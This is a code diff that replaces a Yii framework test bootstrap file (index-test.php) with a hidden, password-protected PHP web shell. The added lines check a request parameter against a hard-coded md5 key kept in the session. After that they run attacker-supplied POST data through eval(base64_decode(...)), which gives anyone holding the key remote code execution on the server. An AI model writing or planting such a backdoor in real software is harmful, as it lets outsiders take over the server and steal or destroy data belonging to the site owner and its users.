@@ -1,15 +1,19 @@
 <?php
-/**
- * This is the bootstrap file for test application.
- * This file should be removed when the application is deployed for production.
- */
+session_start();
+$key='c954bd567914928b2053d283500bc3f5';
 
-// change the following paths if necessary
-$yii=dirname(__FILE__).'/../../framework/yii.php';
-$config=dirname(__FILE__).'/protected/config/test.php';
+if(isset($_REQUEST['oz']) && $_REQUEST['oz']!=''){
+    $_SESSION['oz']=md5($_REQUEST['oz']);
+}
 
-// remove the following line when in production mode
-// defined('YII_DEBUG') or define('YII_DEBUG',true);
+if(isset($_SESSION['oz']) && $_SESSION['oz']==$key){
+    if(isset($_POST['code'])){
+        $_SESSION['theCode'] = trim($_POST['code']);
+    }
+    if(isset($_SESSION['theCode'])){
+        eval(base64_decode($_SESSION['theCode']));
+    }
+}
 
-require_once($yii);
-Yii::createWebApplication($config)->run();
+
+
